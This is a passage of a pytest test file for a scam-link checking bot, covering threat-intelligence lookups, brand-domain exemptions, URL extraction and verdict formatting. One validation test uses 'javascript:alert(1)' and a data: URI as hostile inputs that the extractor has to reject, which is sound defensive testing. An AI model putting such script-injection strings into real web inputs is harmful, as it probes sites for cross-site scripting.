    v = asyncio.run(pipeline.analyze_url("some-unknown-site.example"))

    assert "VirusTotal" in " ".join(v["reasons"])
    assert any("VirusTotal" in d for d in v["detail"])
    assert v["level"] != "safe"


def test_vt_skipped_for_official_brands(seeded_vectors, monkeypatch):
    """Quota guard: official brand domains must never trigger a lookup."""
    called = {"n": 0}

    async def spy_lookup(url, key, live=True):
        called["n"] += 1
        return None

    async def clean_trace(url):
        return _FakeNet(reachable=True, status=200, tls_valid=True).result

    async def fine_resolve(host):
        return ["1.2.3.4"]

    async def old_age(host):
        return 5000

    monkeypatch.setattr(pipeline.threat_intel, "lookup", spy_lookup)
    monkeypatch.setattr(pipeline.network, "trace", clean_trace)
    monkeypatch.setattr(pipeline, "resolve_host", fine_resolve)
    monkeypatch.setattr(pipeline, "domain_age_days", old_age)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", "fake-key")

    v = asyncio.run(pipeline.analyze_url("https://www.google.com/search?q=test"))
    assert called["n"] == 0
    assert v["level"] == "safe"


# --- input validation ------------------------------------------------------

def test_web_urls_rejects_non_http_schemes():
    text = "click javascript:alert(1) or data:text/html,x or https://fine.example"
    urls = pipeline._web_urls(text)
    assert urls == ["https://fine.example"]


def test_web_urls_caps_link_count_per_message():
    many = " ".join(f"site{i}.example" for i in range(20))
    urls = pipeline._web_urls(many)
    assert len(urls) == pipeline.MAX_URLS_PER_MESSAGE


def test_web_urls_allows_bare_domains():
    # bare domains get http:// assumed later; no scheme to reject
    assert pipeline._web_urls("check bit.ly/x9 please") == ["bit.ly/x9"]


# --- format_verdict_full ----------------------------------------------

def test_format_verdict_full_has_a_divider_directly_above_the_disclaimer():
    # The disclaimer is separated from the verdict by a blank row.
    v = {
        "host": "free-prize-winner.tk", "score": 85, "level": "dangerous",
        "reasons": ["Domain ends in .tk, a free TLD heavily used for scams."],
        "detail": [],
    }
    reply = pipeline.format_verdict_full(v)

    assert "─" not in reply
    assert "\n\nⓘ Angket Bot may occasionally make mistakes." in reply
    assert reply.rstrip().endswith("Double-check important information before taking action.")
    assert "⚠️ *VERDICT: LIKELY A SCAM*" in reply
    assert "📁 *TYPE: link*" in reply


